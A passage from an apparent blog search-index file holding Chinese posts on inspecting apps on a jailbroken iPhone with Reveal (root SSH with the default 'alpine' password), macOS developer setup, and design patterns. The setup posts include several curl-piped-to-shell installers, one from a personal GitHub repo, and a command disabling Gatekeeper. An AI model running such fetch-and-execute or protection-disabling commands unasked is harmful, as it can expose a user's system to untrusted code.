Loader\n远程连接iPhone设备\n在Cydia中安装OpenSSH工具\n\n打开Wi-Fi设置，获取IP地址（例如：192.168.2.6）\n\n打开终端，执行命令ssh root@[设备IP地址]（例如：ssh root@192.168.2.6）\n\n等待几分钟后，允许新连接\n\n输入密码alpine登录iPhone设备\n\n\n检查iOS设备上/Library/目录下是否有一个名为RHRevealLoader的目录\n\n若没有则创建该目录：mkdir /Library/RHRevealLoader\n\n启动Reveal并选择Help → Show Reveal Library in Finder，这将会打开Finder窗口，并显示一个名为iOS-Libraries的文件夹。  将该目录下的libReveal.dylib通过scp或者iFunBox上传到刚才的手机目录，scp执行的命令如下：\n scp /Applications/Reveal.app/Contents/SharedSupport/iOS-Libraries/libReveal.dylib root@192.168.2.6:/Library/RHRevealLoader\n\n重启设备\n可以在设备上执行命令：killall SpringBoard\n也可以重启设备，不过需要注意的是，最新的越狱为不完美越狱，重启设备需要点击PP盘古越狱重新越狱\n\n启动Reveal调试别人的App\n打开设置程序，配置Reveal Loader \n在Reveal设置中选择你要查看的App，Enabled Applications \n在Reveal中调试查看 调试时，需要注意越狱设备和Mac需要在同一网路环境中 \n\n注意最新版 Reveal v4 下载地址：http://xclient.info/s/reveal.html \n新版本的 Reveal v4 的 libReveal.dylib 改名为 RevealServer.framework 了，逆向分析的时候手机端只要把 RevealServer.framework 目录下的 RevealServer  改名为 libReveal.dylib 拷贝到手机上的 /Library/RHRevealLoader 目录中即可。\n\t\n参考文章\nhttp://wiki.jikexueyuan.com/project/ios-security-defense/reveal.html\niOS应用逆向工程\nhttps://xiuchundao.me/post/integrating-reveal-inspect-app-on-jailbreak-device-with-reveal\n\n","categories":["iOS"],"tags":["Tools","Reveal","Jailbreak"]},{"title":"macOS 开发配置手册——设置篇","url":"/2016/07/29/macOS-Setup-Guide-Setting/","content":"\n工欲善其事，必先利其器。—— 设置篇\n\n\n\n系统设置将功能键(F1-F12)设置为标准的功能键MacBook键盘最上面一排的功能键(F1-F12)默认是系统亮度和声音之类的快捷设置，当MacBook作为你的娱乐电脑时，这样的默认设置是非常方便的，但是对于将MacBook作为工作电脑而且需要频繁使用功能键(F1-F12)的人，最好将功能键(F1-F12)的行为设置为标准的功能键。\n打开【系统设置】，点击【键盘】，设置如下：\n设置触摸板打开【系统设置】，点击【触摸板】，根据需要设置，众享丝滑。\n将Dock停靠在屏幕左边MacBook的屏幕是一个长方形，如果你将Dock放在下面，那么屏幕的可用宽度就会减少，另外人眼阅读时的顺序是从左往右，因此Dock放在左边更适合将MacBook作为工作电脑的人。\n打开【系统设置】，点击【Dock】,\n\n将图标的Size调到合适大小\n关闭放大特效（即鼠标放到Dock上图标放大的效果，此效果干扰注意力）\n在【置于屏幕上的位置】一栏，选择【左边】\n勾选【将窗口最小化为应用程序图标】\n\n\n快速锁定屏幕打开【系统设置】，点击【桌面与屏幕保护程序】图标，选择【屏幕保护程序】标签页，点击右下角的【触发角..】，在弹出的界面中右下角选择【将显示器置入睡眠状态】，点击【好】确定。\n系统常用快捷键学习系统快捷键，适当使用快捷键将会提升你的工作效率。\n壁纸下载地址：http://bbs.feng.com/read-htm-tid-4254274.htmlMac 键盘快捷键 官方总览：https://support.apple.com/zh-cn/HT201236\n关闭自动纠正拼写有些时候在文本输入框中输入文本时，会出现如下情况。一按空格键或者回车键会填写弹出框的文本，很烦人。\n\n可以通过【关闭自动纠正拼写】解决\n\ntree命令中文文件名显示异常\n解决办法：追加tree -N参数\nMac 中滚动截屏安装腾讯的snip\n官方下载地址\n详细设置教程\nHow to Solve Missing Fonts in Sketch AppAll you have to do is enter the following command in Terminal.\n$ curl https://raw.githubusercontent.com/qrpike/Web-Font-Load/master/install.sh | sh\nLost permission for sudo in OSX El CaptainThe easiest way to restore both was starting Script Editor and then typing and running that script:\ndo shell script &quot;/usr/sbin/chown root:wheel /&quot; with administrator privilegesdo shell script &quot;/bin/chmod 755 /&quot; with administrator privileges\n\n找回允许任何来源选项sudo spctl --master-disable\n\n\n","categories":["MacOS"],"tags":["Tools","Setup Guide"]},{"title":"macOS 开发配置手册——工具篇","url":"/2016/07/29/macOS-Setup-Guide-Tools/","content":"\n工欲善其事，必先利其器。—— 工具篇\n\n\n\n命令行工具Xcode Command Line Tools从 App store 或苹果开发者网站安装 Xcode 。  \n紧接着，在终端中运行安装 Xcode Command Line Tools，执行命令：\n$ xcode-select --install\n\nzshzsh的介绍可以查看池老师的文章终极 Shell\n切换zsh切换当前用户的shell，执行命令：\n$ chsh -s /bin/zsh\n\n执行时会要求输入密码\n安装oh-my-zsh通过curl安装：\n$ sh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;\n\n配置zshzsh 的配置主要集中在用户当前目录的.zshrc里，用 vim 或你喜欢的其他编辑器打开.zshrc，具体配置参见官方文档：https://github.com/robbyrussell/oh-my-zsh\nHomebrew包管理工具可以让你安装和更新程序变得更方便，目前在 macOS 系统中最受欢迎的包管理工具是 Homebrew 。\n安装在安装 Homebrew 之前，需要将 Xcode Command Line Tools 安装完成，这样你就可以使用基于 Xcode Command Line Tools 编译的 Homebrew。\n在终端中执行以下命令，跟随指引，将完成 Hombrew 安装。\n$ /usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot; \n\n检查brew是否运行正常：\n$ brew doctor \n\nHomebrew 基本使用安装程序包：\n$ brew install &lt;package_name&gt;\n\n更新本地Homebrew和程序包缓存：\n$ brew update\n\n更新程序包：\n$ brew upgrade &lt;package_name&gt;\n\n清除旧版程序包：\n$ brew cleanup\n\n查看已安装过的程序包列表：\n$ brew list --versions\n\n常用程序包$ brew install carthage$ brew install cmake$ brew install ffmpeg$ brew install gdb\t\t\t// GNU debugger$ brew install git-flow\t//$ brew install jenkins$ brew install llvm\t\t\t// Next-gen compiler infrastructure$ brew install node$ brew install nvm$ brew install rmtrash\t\t// Move files to OS X&#x27;s Trash$ brew install rename\t\t// Perl-powered file rename script with many helpful built-ins$ brew install subversion$ brew install swiftenv\t// Swift version manager$ brew install tldr\t\t\t// $ brew install tree\t\t\t//$ brew install wget$ brew install xctool$ brew install binutils // FSF/GNU ld, ar, readelf, etc. for native development\n\n安装Homebrew Cask通过 Homebrew Cask 优雅、简单、快速的安装和管理 OS X 图形界面程序，比如 Google Chrome 和 Dropbox。\n$ brew tap caskroom/cask  // 添加 Github 上的 caskroom/cask 库$ brew install brew-cask  // 安装 brew-cask$ brew cask install google-chrome // 安装 Google 浏览器$ brew update &amp;&amp; brew upgrade brew-cask &amp;&amp; brew cleanup // 更新\n\n文件预览插件https://github.com/sindresorhus/quick-look-plugins\n有些 插件 可以让 Mac 上的文件预览更有效，比如语法高亮、markdown 渲染、json 预览等等。\n$ brew cask install qlcolorcode qlstephen qlmarkdown quicklook-json qlimagesize webpquicklook suspicious-package quicklookase qlvideo$ brew cask install provisionql\n\nlaunchrocketbrew cask 安装 launchrocket，来管理通过 brew 安装的 service\n$ brew cask install launchrocket\n\n\nRubyRVMRVM 是一个命令行工具，可以提供一个便捷的多版本 Ruby 环境的管理和切换。\nhttps://rvm.io/\nRVM 安装$ curl -sSL https://get.rvm.io | bash -s stable --auto-dotfiles$ source ~/.rvm/scripts/rvm\n\n修改 RVM 的 Ruby 安装源到 Ruby China 的 Ruby 镜像服务器，这样能提高安装速度。\n$ echo &quot;ruby_url=https://cache.ruby-china.org/pub/ruby&quot; &gt; ~/.rvm/user/db\n\nRuby 的安装与切换列出已知的 Ruby 版本\n$ rvm list known\n\n安装一个 Ruby 版本\n$ rvm install 2.3.0\n\n切换 Ruby 版本\n$ rvm use 2.3.0\n\n如果想设置为默认版本，这样一来以后新打开的控制台默认的 Ruby 就是这个版本\nrvm use 2.3.0 --default\n\n查询已经安装的ruby\nrvm list\n\n卸载一个已安装版本\nrvm remove 2.3.0\n\nRubyGemsRubyGems 是 Ruby 的一个包管理器，提供了分发 Ruby 程序和函式庫的标准格式“gem”，旨在方便地管理gem安装的工具，以及用于分发gem的服务器。\n$ gem install cocoapods$ gem install fastlane$ gem install tty$ gem install leancloud\n\nPythonpyenvPython 多版本管理器，可以用来管理和切换不同的 Python 版本。\n安装$ brew install pyenv\n\n配置如果使用的是bash\n$ echo &#x27;export PYENV_ROOT=&quot;$HOME/.pyenv&quot;&#x27; &gt;&gt; ~/.bashrc$ echo &#x27;export PATH=&quot;$PYENV_ROOT/bin:$PATH&quot;&#x27; &gt;&gt; ~/.bashrc$ echo &#x27;eval &quot;$(pyenv init -)&quot;&#x27; &gt;&gt; ~/.bashrc\n\n如果使用的是zsh\n$ echo &#x27;export PYENV_ROOT=&quot;$HOME/.pyenv&quot;&#x27; &gt;&gt; ~/.zshrc$ echo &#x27;export PATH=&quot;$PYENV_ROOT/bin:$PATH&quot;&#x27; &gt;&gt; ~/.zshrc$ echo &#x27;eval &quot;$(pyenv init -)&quot;&#x27; &gt;&gt; ~/.zshrc\n\n使用查看现在使用的 Python 版本\n$ pyenv version\n\n查看可供 pyenv 使用的 Python 版本\n$ pyenv versions\n\n安装 Python 版本\n$ pyenv install 3.5.2\n\n安装的版本会在~&#x2F;.pyenv&#x2F;versions目录下。\n此外，可以用 --list 参数查看所有可安装版本\n$ pyenv install --list\n\n卸载 Python 版本\n$ pyenv uninstall 3.5.2\n\n设置全局 Python 版本，一般不建议改变全局设置\n$ pyenv global 3.5.2\n\n设置局部 Python 版本\n$ pyenv local 3.5.2\n\n设置之后可以在目录内外分别试下 which python或 python --version 看看效果, 如果没变化的话可以 python rehash 之后再试试\npip &amp; setuptoolspip 和 setuptools 是 Python 的包管理器。\n更新 pip 和 setuptools 包管理器：\npip install --upgrade pip setuptools\n\n安装程序包\npip install &lt;package&gt;\n\n通过依赖文件安装程序包\npip install -r requirements.txt\n\n卸载程序包\n$ pip uninstall &lt;package&gt;\n\n查看所有已安装程序包\n$ pip list\n\n搜索程序包\n$ pip search &quot;query&quot;\n\n升级程序包\n$ pip install --upgrade SomePackage\n\n\n常用 Python 程序包\n$ pip install beautifulsoup4 // HTML解析$ pip install NetEase-MusicBox // 网易云音乐命令行版$ pip install starred\t// 利用GitHub上stars项目生成类 awesome 列表的汇总页面。\n\nNodenvmnode 的版本管理工具。\n安装$ brew install nvm\n\n配置添加一下代码到 .zshrc 配置文件中：\nexport NVM_DIR=&quot;$HOME/.nvm&quot;. &quot;/usr/local/opt/nvm/nvm.sh&quot;\n\n使用Usage:  nvm --help                                Show this message  nvm --version                             Print out the latest released version of nvm  nvm install [-s] &lt;version&gt;                Download and install a &lt;version&gt;, [-s] from source. Uses .nvmrc if available    --reinstall-packages-from=&lt;version&gt;     When installing, reinstall packages installed in &lt;node|iojs|node version number&gt;    --lts                                   When installing, only select from LTS (long-term support) versions    --lts=&lt;LTS name&gt;                        When installing, only select from versions for a specific LTS line  nvm uninstall &lt;version&gt;                   Uninstall a version  nvm uninstall --lts                       Uninstall using automatic LTS (long-term support) alias `lts/*`, if available.  nvm uninstall --lts=&lt;LTS name&gt;            Uninstall using automatic alias for provided LTS line, if available.  nvm use [--silent] &lt;version&gt;              Modify PATH to use &lt;version&gt;. Uses .nvmrc if available    --lts                                   Uses automatic LTS (long-term support) alias `lts/*`, if available.    --lts=&lt;LTS name&gt;                        Uses automatic alias for provided LTS line, if available.  nvm exec [--silent] &lt;version&gt; [&lt;command&gt;] Run &lt;command&gt; on &lt;version&gt;. Uses .nvmrc if available    --lts                                   Uses automatic LTS (long-term support) alias `lts/*`, if available.    --lts=&lt;LTS name&gt;                        Uses automatic alias for provided LTS line, if available.  nvm run [--silent] &lt;version&gt; [&lt;args&gt;]     Run `node` on &lt;version&gt; with &lt;args&gt; as arguments. Uses .nvmrc if available    --lts                                   Uses automatic LTS (long-term support) alias `lts/*`, if available.    --lts=&lt;LTS name&gt;                        Uses automatic alias for provided LTS line, if available.  nvm current                               Display currently activated version  nvm ls                                    List installed versions  nvm ls &lt;version&gt;                          List versions matching a given &lt;version&gt;  nvm ls-remote                             List remote versions available for install    --lts                                   When listing, only show LTS (long-term support) versions  nvm ls-remote &lt;version&gt;                   List remote versions available for install, matching a given &lt;version&gt;    --lts                                   When listing, only show LTS (long-term support) versions    --lts=&lt;LTS name&gt;                        When listing, only show versions for a specific LTS line  nvm version &lt;version&gt;                     Resolve the given description to a single local version  nvm version-remote &lt;version&gt;              Resolve the given description to a single remote version    --lts                                   When listing, only select from LTS (long-term support) versions    --lts=&lt;LTS name&gt;                        When listing, only select from versions for a specific LTS line  nvm deactivate                            Undo effects of `nvm` on current shell  nvm alias [&lt;pattern&gt;]                     Show all aliases beginning with &lt;pattern&gt;  nvm alias &lt;name&gt; &lt;version&gt;                Set an alias named &lt;name&gt; pointing to &lt;version&gt;  nvm unalias &lt;name&gt;                        Deletes the alias named &lt;name&gt;  nvm reinstall-packages &lt;version&gt;          Reinstall global `npm` packages contained in &lt;version&gt; to current version  nvm unload                                Unload `nvm` from shell  nvm which [&lt;version&gt;]                     Display path to installed node version. Uses .nvmrc if available  nvm cache dir                             Display path to the cache directory for nvm  nvm cache clear                           Empty cache directory for nvmExample:  nvm install v0.10.32                  Install a specific version number  nvm use 0.10                          Use the latest available 0.10.x release  nvm run 0.10.32 app.js                Run app.js using node v0.10.32  nvm exec 0.10.32 node app.js          Run `node app.js` with the PATH pointing to node v0.10.32  nvm alias default 0.10.32             Set default node version on a shellNote:  to remove, delete, or uninstall nvm - just remove the `$NVM_DIR` folder (usually `~/.nvm`)\n\nnpmnode 的包管理器。\n安装 node 程序包有两种方式：\n\n安装在本地工程项目中，只能本地项目使用，安装命令如下：\n\n$ npm install &lt;package&gt; --save\n\n\n安装为全局程序包，安装命令如下：\n\n$ npm install -g &lt;package&gt;\n\n常用全局 npm 程序包$ npm install -g hexo-cli\t// 静态博客$ npm install -g ionic\t\t// Hybird 开发$ npm install -g react-native-cli // React Native 开发\n\n查找命令findfind是最常见和最强大的查找命令，你可以用它找到任何你想找的文件。\nfind的使用格式如下：\n$ find &lt;指定目录&gt; &lt;指定条件&gt; &lt;指定动作&gt;- &lt;指定目录&gt;： 所要搜索的目录及其所有子目录。默认为当前目录。- &lt;指定条件&gt;： 所要搜索的文件的特征。- &lt;指定动作&gt;： 对搜索结果进行特定的处理。\n\nlocatelocate命令其实是”find -name”的另一种写法，但是要比后者快得多，原因在于它不搜索具体目录，而是搜索一个数据库（&#x2F;var&#x2F;lib&#x2F;locatedb），这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次，所以使用locate命令查不到最新变动过的文件。为了避免这种情况，可以在使用locate之前，先使用updatedb命令，手动更新数据库。\nlocate命令的使用实例：$ locate /etc/sh搜索etc目录下所有以sh开头的文件。$ locate ~/m搜索用户主目录下，所有以m开头的文件。$ locate -i ~/m搜索用户主目录下，所有以m开头的文件，并且忽略大小写。\n\nwhereiswhereis命令只能用于程序名的搜索，而且只搜索二进制文件（参数-b）、man说明文件（参数-m）和源代码文件（参数-s）。如果省略参数，则返回所有信息。\nwhereis命令的使用实例：$ whereis grep\n\nwhichwhich命令的作用是，在PATH变量指定的路径中，搜索某个系统命令的位置，并且返回第一个搜索结果。也就是说，使用which命令，就可以看到某个系统命令是否存在，以及执行的到底是哪一个位置的命令。\nwhich命令的使用实例：$ which grep\n\n生成 SSH Keysssh-keygen -t rsa -C &quot;your_email@example.com&quot;\n\nGUI工具常用工具替换系统默认终端 - iTerm 2中文输入法推荐安装搜狗输入法。\n窗口管理软件 - SizeUp查找文件和应用程序 - AlfredAlfred is an award-winning app for Mac OS X which boosts your efficiency with hotkeys, keywords, text expansion and more. Search your Mac and the web, and be more productive with custom actions to control your Mac.\n来杯免费咖啡 - Caffeine你应该立刻安装这款免费的良心软件—Caffeine，设置开机启动，点一下状态栏的咖啡杯图标，当咖啡是满的时候，MacBook将不会进入休眠模式，再点一下咖啡杯空了就正常休眠，我默认设置开机启动，咖啡杯保持满满的状态。\n快速切换和打开应用程序 - ManicoMacBook系统默认设置了一个快捷键来显示当前运行中的应用程序，同时按下tab + command，将看到如下图的样式：\n随心所欲的复制粘贴 - PopClip增强资源管理器 - XtraFinder管理状态栏图标 - Bartender音乐播放器 - 网易云音乐词典 - 有道词典文本编辑 - Atom，Visual Studio Code文本比较 - Beyond Compare垃圾清理 - CleanMyMac 3U盘启动制作 - DiskMaker X 5笔记 - Evernote屏幕颜色调整（保护眼睛）- Flux图床 - iPic系统监测 - iStat Menusgif 录制 - licecapMarkdown - MacDown，MWeb，Typora思维导图 - MindNode，XMind视频播放 - MPlayerX流程图制作 - OmniGraffle绘图 - Paintbrush虚拟机 - Parallels Desktop，VirtualBox壁纸 - Pimp Your ScreenMac版PhotoShop - Pixelmator稍候阅读 - Pocket番茄钟 - Pomodoro Time录屏 - ScreenFlow翻墙 - Lantern，ShadowsocksX，Surge屏幕截图 - Snip解压缩 - The Unarchiver开发工具文档查看 - DashAndorid 开发 - Android Studio原型设计 - Axure RP网络抓包 - CharlesiOS 动画制作 - Core AnimatorSVN版本控制管理 - CornerstoneGit版本控制管理 - SourceTreeHTML 5 制作 - Hype 3应用程序图标制作 - IconKitObjective-C 转换为Swift代码 - iSwiftjson数据解析 - Jason，JSON Wizard数据库 - Navicat PremiumSQLite数据库 - sqlitebrowser查看Github Star - OhMyStarTurn drawings into code - PaintCodeHTTP API 测试 - PawiOS UI 调试 - Reveal屏幕取色 - Sip移动应用原型设计 - SketchUML绘图 - StarUML","categories":["MacOS"],"tags":["Tools","Setup Guide"]},{"title":"设计模式 （Design Pattern）","url":"/2016/06/30/Design-Pattern/","content":"面向过程和面向对象\n面向过程是祈使句，面向对象是主谓（宾）结构。\n\n面向过程注重数据的存储和操作，面向对象注重用程序模拟生活逻辑。\n\n面向过程数据和操作数据的过程是分离的，没有逻辑上的必然联系；面向对象中数据和操作数据的方法是逻辑上的整体，称之为对象。\n\n\n面向对象的基本概念\n对象：现实世界中的对象是我们认识世界的基本单元，世界就是由这些基本单元组成的。一切皆为对象；每个对象都是独一无二的；对象都有属性和行为；对象都属于某个类。\n\n类：类是对一组具有共同属性和行为的对象的抽象，它是对象的蓝图和模板。\n\n消息：对象与对象之间存在着一定的联系，这种联系通过消息的传递来实现。程序中的一切操作都通过向对象发送消息来实现，对象接收到消息后，调用有关对象的行为来完成相应的操作。\n\n\n面向对象的3个基本要素封装封装是把一个事物包装起来，使外界不了解它的内部的具体情况。在面向对象的程序设计中，封装就是把相关的数据和代码结合成一个有机的整体，形成数据和操作代码的封装体，对外只提供一个可以控制的接口，内部大部分的实现细节对外隐蔽，达到对数据访问权的合理控制。封装使程序中个部分之间的相互联系达到最小，提高了程序的安全性，简化了程序代码的编写工作。\n继承继承是从已有的类创建新类的过程，提供继承信息的称为父类，得到继承信息的称为子类，子类和父类之间是IS-A关系，继承使得类与类之间形成一个层次结构。\n多态多态是不同结构的对象可以以各自不同的方式响应同一个消息，或者说同一个消息可以根据发送消息的对象的不同而采用多种不同的操作行为，这是面向对象最精髓的部分。\n\n\n软件设计终极原则：高内聚 低耦合内聚一个模块内各个元素彼此结合的紧密程度。\n在一个模块内，让每个元素之间都尽可能的紧密相连。\n也就是充分利用每一个元素的功能，各施所能，以最终实现某个功能。\n如果某个元素与该模块的关系比较疏松的话，可能该模块的结构还不够完善，或者是该元素是多余的。\n耦合一个软件结构内不同模块之间互连程度的度量。\n一个完整的系统，模块与模块之间，尽可能的使其独立存在。\n也就是说，让每个模块，尽可能的独立完成某个特定的子功能。\n模块与模块之间的接口，尽量的少而简单。\n如果某两个模块间的关系比较复杂的话，最好首先考虑进一步的模块划分。\n这样有利于修改和组合。\n内聚、耦合的区别与联系内聚和耦合，包含了横向和纵向的关系。功能内聚和数据耦合，是我们需要达成的目标。横向的内聚和耦合，通常体现在系统的各个模块、类之间的关系，而纵向的耦合，体现在系统的各个层次之间的关系。\n耦合性着重于不同模块之间的相依性，而内聚性着重于一模块中不同功能之间的关系性。\n并不是内聚越高越好，耦合越低越好，真正好的设计是在高内聚和低耦合间进行平衡，也就是说高内聚和低耦合是冲突的。\n最强的内聚莫过于一个类只写一个函数，这样内聚性绝对是最高的。但这会带来一个明显的问题：类的数量急剧增多，这样就导致了其它类的耦合特别多，于是整个设计就变成了“高内聚高耦合”了。由于高耦合，整个系统变动同样非常频繁。\n对于耦合来说，最弱的耦合是一个类将所有的函数都包含了，这样类完全不依赖其它类，耦合性是最低的。但这样会带来一个明显的问题：内聚性很低，于是整个设计就变成了“低耦合低内聚”了。由于低内聚，整个类的变动同样非常频繁。\n对于“低耦合低内聚”来说，还有另外一个明显的问题：几乎无法被其它类重用。原因很简单，类本身太庞大了，要么实现很复杂，要么数据很大，其它类无法明确该如何重用这个类。\n面向对象七原则（SOLID）S：单一职责原则（Single-Resposibility Principle）其核心思想为：一个类，最好只做一件事，只有一个引起它的变化。单一职责原则可以看做是低耦合、高内聚在面向对象原则上的引申，将职责定义为引起变化的原因，以提高内聚性来减少引起变化的原因。职责过多，可能引起它变化的原因就越多，这将导致职责依赖，相互之间就产生影响，从而大大损伤其内聚性和耦合度。通常意义下的单一职责，就是指只有一种单一功能，不要为类实现过多的功能点，以保证实体只有一个引起它变化的原因。\n专注，是一个人优良的品质；同样的，单一也是一个类的优良设计。交杂不清的职责将使得代码看起来特别别扭牵一发而动全身，有失美感和必然导致丑陋的系统错误风险。\nO：开放封闭原则（Open-Closed principle）其核心思想是：软件实体应该是可扩展的，而不可修改的。也就是，对扩展开放，对修改封闭的。开放封闭原则主要体现在两个方面1、对扩展开放，意味着有新的需求或变化时，可以对现有代码进行扩展，以适应新的情况。2、对修改封闭，意味着类一旦设计完成，就可以独立完成其工作，而不要对其进行任何尝试的修改。\n实现开开放封闭原则的核心思想就是对抽象编程，而不对具体编程，因为抽象相对稳定。让类依赖于固定的抽象，所以修改就是封闭的；而通过面向对象的继承和多态机制，又可以实现对抽象类的继承，通过覆写其方法来改变固有行为，实现新的拓展方法，所以就是开放的。“需求总是变化”没有不变的软件，所以就需要用封闭开放原则来封闭变化满足需求，同时还能保持软件内部的封装体系稳定，不被需求的变化影响。\nL：里氏替换原则（Liskov-Substituion Principle） 其核心思想是：子类必须能够替换其基类。这一思想体现为对继承机制的约束规范，只有子类能够替换基类时，才能保证系统在运行期内识别子类，这是保证继承复用的基础。在父类和子类的具体行为中，必须严格把握继承层次中的关系和特征，将基类替换为子类，程序的行为不会发生任何变化。同时，这一约束反过来则是不成立的，子类可以替换基类，但是基类不一定能替换子类。\nLiskov替换原则，主要着眼于对抽象和多态建立在继承的基础上，因此只有遵循了Liskov替换原则，才能保证继承复用是可靠地。实现的方法是面向接口编程：将公共部分抽象为基类接口或抽象类，通过Extract Abstract Class，在子类中通过覆写父类的方法实现新的方式支持同样的职责。Liskov替换原则是关于继承机制的设计原则，违反了Liskov替换原则就必然导致违反开放封闭原则。Liskov替换原则能够保证系统具有良好的拓展性，同时实现基于多态的抽象机制，能够减少代码冗余，避免运行期的类型判别。\nI：接口隔离原则（Interface-Segregation Principle）其核心思想是：使用多个小的专门的接口，而不要使用一个大的总接口。\n具体而言，接口隔离原则体现在：接口应该是内聚的，应该避免“胖”接口。一个类对另外一个类的依赖应该建立在最小的接口上，不要强迫依赖不用的方法，这是一种接口污染。接口有效地将细节和抽象隔离，体现了对抽象编程的一切好处，接口隔离强调接口的单一性。而胖接口存在明显的弊端，会导致实现的类型必须完全实现接口的所有方法、属性等；而某些时候，实现类型并非需要所有的接口定义，在设计上这是“浪费”，而且在实施上这会带来潜在的问题，对胖接口的修改将导致一连串的客户端程序需要修改，有时候这是一种灾难。在这种情况下，将胖接口分解为多个特点的定制化方法，使得客户端仅仅依赖于它们的实际调用的方法，从而解除了客户端不会依赖于它们不用的方法。分离的手段主要有以下两种：1、委托分离，通过增加一个新的类型来委托客户的请求，隔离客户和接口的直接依赖，但是会增加系统的开销。2、多重继承分离，通过接口多继承来实现客户的需求，这种方式是较好的。\nD：依赖倒置原则（Dependecy-Inversion Principle）其核心思想是：依赖于抽象。具体而言就是高层模块不依赖于底层模块，二者都同依赖于抽象；抽象不依赖于具体，具体依赖于抽象。\n我们知道，依赖一定会存在于类与类、模块与模块之间。当两个模块之间存在紧密的耦合关系时，最好的方法就是分离接口和实现：在依赖之间定义一个抽象的接口使得高层模块调用接口，而底层模块实现接口的定义，以此来有效控制耦合关系，达到依赖于抽象的设计目标。抽象的稳定性决定了系统的稳定性，因为抽象是不变的，依赖于抽象是面向对象设计的精髓，也是依赖倒置原则的核心。依赖于抽象是一个通用的原则，而某些时候依赖于细节则是在所难免的，必须权衡在抽象和具体之间的取舍，方法不是一层不变的。依赖于抽象，就是对接口编程，不要对实现编程。\n迪米特法则，又称最少知道原则（Demeter Principle）最少知道原则是指：一个实体应当尽量少地与其他实体之间发生相互作用，使得系统功能模块相对独立。\n合成聚合复用原则（Composite Reuse Principle）合成复用原则是指：尽量使用合成&#x2F;聚合的方式，而不是使用继承。\n设计模式设计模式简介设计模式（Design pattern）代表了最佳的实践，通常被有经验的面向对象的软件开发人员所采用。设计模式是软件开发人员在软件开发过程中面临的一般问题的解决方案。这些解决方案是众多软件开发人员经过相当长的一段时间的试验和错误总结出来的。设计模式是一套被反复使用的、多数人知晓的、经过分类编目的、代码设计经验的总结。使用设计模式是为了重用代码、让代码更容易被他人理解、保证代码可靠性。 毫无疑问，设计模式于己于他人于系统都是多赢的，设计模式使代码编制真正工程化，设计模式是软件工程的基石，如同大厦的一块块砖石一样。项目中合理地运用设计模式可以完美地解决很多问题，每种模式在现实中都有相应的原理来与之对应，每种模式都描述了一个在我们周围不断重复发生的问题，以及该问题的核心解决方案，这也是设计模式能被广泛应用的原因。\n什么是 GOF（四人帮，全拼 Gang of Four）？在 1994 年，由 Erich Gamma、Richard Helm、Ralph Johnson 和 John Vlissides 四人合著出版了一本名为 Design Patterns - Elements of Reusable Object-Oriented Software（中文译名：设计模式 - 可复用的面向对象软件元素） 的书，该书首次提到了软件开发中设计模式的概念。四位作者合称 GOF（四人帮，全拼 Gang of Four）。他们所提出的设计模式主要是基于以下的面向对象设计原则。\n\n对接口编程而不是对实现编程。\n优先使用对象组合而不是继承。\n\n设计模式的类型根据设计模式的参考书 Design Patterns - Elements of Reusable Object-Oriented Software（中文译名：设计模式 - 可复用的面向对象软件元素） 中所提到的，总共有 23 种设计模式。这些模式可以分为三大类：创建型模式（Creational Patterns）、结构型模式（Structural Patterns）、行为型模式（Behavioral Patterns）。\n创建型模式（5种）这些设计模式提供了一种在创建对象的同时隐藏创建逻辑的方式，而不是使用新的运算符直接实例化对象。这使得程序在判断针对某个给定实例需要创建哪些对象时更加灵活。\n\n工厂模式（Factory Pattern）\n抽象工厂模式（Abstract Factory Pattern）\n单例模式（Singleton Pattern）\n建造者模式（Builder Pattern）\n原型模式（Prototype Pattern）\n\n工厂模式这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。在工厂模式中，我们在创建对象时不会对客户端暴露创建逻辑，并且是通过使用一个共同的接口来指向新创建的对象。\n介绍意图：定义一个创建对象的接口，让其子类自己决定实例化哪一个工厂类，工厂模式使其创建过程延迟到子类进行。主要解决：主要解决接口选择的问题。何时使用：我们明确地计划不同条件下创建不同实例时。如何解决：让其子类实现工厂接口，返回的也是一个抽象的产品。关键代码：创建过程在其子类执行。应用实例： 1、您需要一辆汽车，可以直接从工厂里面提货，而不用去管这辆汽车是怎么做出来的，以及这个汽车里面的具体实现。 2、Hibernate 换数据库只需换方言和驱动就可以。优点： 1、一个调用者想创建一个对象，只要知道其名称就可以了。 2、扩展性高，如果想增加一个产品，只要扩展一个工厂类就可以。 3、屏蔽产品的具体实现，调用者只关心产品的接口。缺点：每次增加一个产品时，都需要增加一个具体类和对象实现工厂，使得系统中类的个数成倍增加，在一定程度上增加了系统的复杂度，同时也增加了系统具体类的依赖。这并不是什么好事。使用场景： 1、日志记录器：记录可能记录到本地硬盘、系统事件、远程服务器等，用户可以选择记录日志到什么地方。 2、数据库访问，当用户不知道最后系统采用哪一类数据库，以及数据库可能有变化时。 3、设计一个连接服务器的框架，需要三个协议，”POP3”、”IMAP”、”HTTP”，可以把这三个作为产品类，共同实现一个接口。注意事项：作为一种创建类模式，在任何需要生成复杂对象的地方，都可以使用工厂方法模式。有一点需要注意的地方就是复杂对象适合使用工厂模式，而简单对象，特别是只需要通过 new 就可以完成创建的对象，无需使用工厂模式。如果使用工厂模式，就需要引入一个工厂类，会增加系统的复杂度。\n实现我们将创建一个 Shape 接口和实现 Shape 接口的实体类。下一步是定义工厂类 ShapeFactory。FactoryPatternDemo，我们的演示类使用 ShapeFactory 来获取 Shape 对象。它将向 ShapeFactory 传递信息（CIRCLE &#x2F; RECTANGLE &#x2F; SQUARE），以便获取它所需对象的类型。\n\n抽象工厂模式抽象工厂模式（Abstract Factory 